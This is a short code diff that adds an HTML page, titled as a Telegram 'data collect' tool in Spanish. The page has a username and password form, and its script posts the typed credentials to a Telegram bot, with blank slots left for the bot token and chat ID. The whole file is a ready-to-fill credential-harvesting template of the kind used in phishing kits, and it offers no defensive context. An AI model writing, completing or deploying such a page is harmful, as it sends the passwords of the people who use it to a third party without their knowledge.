@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DataCollectTgram</title>
+</head>
+<body>
+    <h2>Data Collect de Telegram</h2>
+
+    <input type="text" id="usuario" placeholder="Usuario"><br><br>
+    <input type="password" id="password" placeholder="Contraseña"><br><br>
+
+    <button onclick="enviar()">Enviar</button>
+
+    <script>
+        function enviar() {
+            const usuario = document.getElementById("usuario").value;
+            const password = document.getElementById("password").value;
+
+            const token = "";
+            const chatId = "";
+
+            const mensaje = `Login de prueba:\nUsuario: ${usuario}\nPassword: ${password}`;
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: mensaje
+                })
+            })
+            .then(() => {
+                alert("Datos enviados");
+            })
+            .catch(() => {
+                alert("Error al enviar");
+            });
+        }
+    </script>
+</body>
+</html>
